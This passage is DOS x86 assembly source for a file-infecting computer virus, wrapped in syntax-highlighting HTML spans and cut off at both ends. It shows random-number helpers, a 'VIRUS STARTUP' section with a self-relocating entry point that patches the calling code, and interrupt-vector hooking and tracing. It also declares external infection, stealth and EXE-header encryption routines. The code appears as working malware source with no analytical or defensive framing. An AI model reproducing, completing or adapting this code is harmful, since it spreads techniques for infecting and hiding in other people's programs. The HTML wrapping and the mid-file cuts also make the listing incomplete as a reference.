</span><span class="sc5">r_lo</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">r_lo</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1111h</span><span class="sc0">
</span><span class="sc5">r_hi</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">r_hi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">sahf</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;    dd      ?</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">RND_INIT</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">43h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">43h</span><span class="sc4">*</span><span class="sc2">11h</span><span class="sc4">+</span><span class="sc2">46Ch</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;lo</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">r_lo</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">43h</span><span class="sc4">*</span><span class="sc2">11h</span><span class="sc4">+</span><span class="sc2">46Eh</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;hi</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">r_hi</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">r_hi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;extrn Calculate_CRC :near</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">RND_GET_BYTE</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RND_GET</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">RND_GET_THREE_BITS</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RND_GET_BYTE</span><span class="sc0">
    </span><span class="sc6">pushf</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00000111b</span><span class="sc0">
    </span><span class="sc6">popf</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;rnd_procs_size = $-begin_rnd_procs</span><span class="sc0">
</span><span class="sc9">ends</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0">

</span><span class="sc9">INCLUDE</span><span class="sc0"> </span><span class="sc5">ZURICH.ASI</span><span class="sc0">
</span><span class="sc5">code</span><span class="sc0"> </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0">
</span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc0">

</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">InfectTurn</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">r_lo</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">r_hi</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0">
   </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">InfectName</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">get_crc_just_fname</span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">heap</span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">crypt_exe_header</span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">no_freq_proc</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">crypt_exe_header_custom</span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">WRITE_EXEHDR</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">TEST_SIZE</span><span class="sc0">    </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">STEALTHNAME</span><span class="sc0">  </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GET_SFT</span><span class="sc0">      </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">vir_heap</span><span class="sc0">     </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">InfectHandle</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">start_data</span><span class="sc0">   </span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">get_own_name</span><span class="sc0">    </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">heap</span><span class="sc0">            </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">st25</span><span class="sc0">            </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">ret_hook</span><span class="sc0">        </span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">ret_sux</span><span class="sc0">         </span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">continue21</span><span class="sc0">      </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">get_cur_time</span><span class="sc0">    </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">calculate_crc</span><span class="sc0">   </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">vir_heap</span><span class="sc0">        </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">Calculate_CRC</span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">Calculate_CRC5</span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">

</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;ÄÄÄ   VIRUS STARTUP   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
       </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">virus_zero</span><span class="sc0">
       </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0cH</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">opNOP</span><span class="sc4">)</span><span class="sc0">
       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">;bp-30h : SS</span><span class="sc0">
       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">;bp-2eh : SP</span><span class="sc0">
       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;bp-2ch : sum</span><span class="sc0">
       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0Ah</span><span class="sc4">+</span><span class="sc2">0cH</span><span class="sc0">               </span><span class="sc1">;bp-2ah : IP</span><span class="sc0">
       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;bp-28h : CS</span><span class="sc0">

        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc9">.EXIT</span><span class="sc0">
        </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc5">VIRUSSTACKSIZE</span><span class="sc4">-</span><span class="sc2">16h</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">begin_stack</span><span class="sc0">
</span><span class="sc5">st_es</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;-16</span><span class="sc0">
</span><span class="sc5">st_ds</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;-14</span><span class="sc0">
</span><span class="sc5">st_di</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;-12</span><span class="sc0">
</span><span class="sc5">st_si</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;-10</span><span class="sc0">
</span><span class="sc5">st_bp</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;-E</span><span class="sc0">
</span><span class="sc5">st_sp</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;-C</span><span class="sc0">
</span><span class="sc5">st_bx</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;-A</span><span class="sc0">
</span><span class="sc5">st_dx</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;-8</span><span class="sc0">
</span><span class="sc5">st_cx</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;-6</span><span class="sc0">
</span><span class="sc5">st_ax</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;-4</span><span class="sc0">
</span><span class="sc5">st_fl</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;-2</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">end_stack</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">virus_entry</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">vs</span><span class="sc0">
</span><span class="sc9">public</span><span class="sc0"> </span><span class="sc5">_____</span><span class="sc0">
</span><span class="sc5">_____</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc4">(</span><span class="sc5">zmeflARX</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc1">;0-classic EXE</span><span class="sc0">
</span><span class="sc1">;1-abnormal termination (for carrier)</span><span class="sc0">
</span><span class="sc1">;2-retf</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">relocator</span><span class="sc0">
        </span><span class="sc5">DO</span><span class="sc0">
            </span><span class="sc5">SEGCS</span><span class="sc0"> </span><span class="sc6">lodsb</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">opSEGCS</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">88h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">44h</span><span class="sc0">
</span><span class="sc5">shiftval</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc1">;            mov cs:[si+shiftval], al</span><span class="sc0">
        </span><span class="sc5">CYCLE</span><span class="sc0"> </span><span class="sc5">LU</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">vs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">std</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_____</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11h</span><span class="sc0"> </span><span class="sc1">;suxxx*10h+1h   ;   suxxx=1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">shiftval</span><span class="sc4">)-(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_____</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">sar</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">;        sub     ax, suxxx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">opCALL</span><span class="sc0">
        </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">E</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">shiftval</span><span class="sc4">)-(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_____</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc2">060h</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06h</span><span class="sc0">
            </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0ECh</span><span class="sc0">
            </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">8Bh</span><span class="sc0">
            </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">55h</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
            </span><span class="sc6">pushf</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">vvvo</span><span class="sc0">
        </span><span class="sc5">DOELSE</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">vvv</span><span class="sc0">
        </span><span class="sc5">DONE</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+((</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start_data</span><span class="sc4">))-</span><span class="sc5">_____</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start_data</span><span class="sc4">)-</span><span class="sc5">VIRUSSTACKSIZE</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">relocator</span><span class="sc0">
</span><span class="sc1">;-------------</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">vvvo</span><span class="sc0">
</span><span class="sc5">begin_auto</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">frret</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">popf</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">vvv</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">

       </span><span class="sc1">;save vect1</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
       </span><span class="sc5">MOVSEG</span><span class="sc0">   </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">tmp1</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2501h</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0">      </span><span class="sc2">21h</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0">

       </span><span class="sc6">pushf</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">trace_cpm</span><span class="sc0">
       </span><span class="sc6">popf</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">_____</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">zmeflOBJ</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">)</span><span class="sc0">
       </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">E</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">

</span><span class="sc5">retobj</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0EAh</span><span class="sc0">
</span><span class="sc5">public_key</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">frret</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
       </span><span class="sc5">DONE</span><span class="sc0">

